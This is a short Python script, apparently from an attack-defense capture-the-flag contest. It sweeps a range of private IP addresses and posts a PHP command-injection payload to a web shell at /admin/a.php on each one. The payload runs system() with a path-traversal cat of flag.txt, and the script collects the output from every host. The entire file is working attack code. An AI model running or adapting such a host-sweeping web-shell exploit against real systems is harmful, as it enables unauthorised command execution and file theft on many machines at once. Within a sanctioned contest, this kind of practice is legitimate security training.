# -*- coding: utf-8 -*-
"""
Created on Wed Jul 10 10:14:13 2019

@author: 24592
"""


import requests

iplist = []
for i in range(101,144):
    iplist.append("172.20.{0}.102".format(str(i)))

for ip in iplist:
    try:    
        url = "http://{0}/admin/a.php".format(str(ip))        
#url = 'http://172.20.104.102/index.php'
        data = {'aaa':'system("/bin/cat ../../../flag.txt");'}

        r = requests.post(url,data)
        print(r.status_code)
        a = r.text
        print(ip)
        print (a[-32:])
        with open('flag.txt','wa') as f:
            f.write(ip)
            f.write(a[-32:])
            

    except:
        pass
    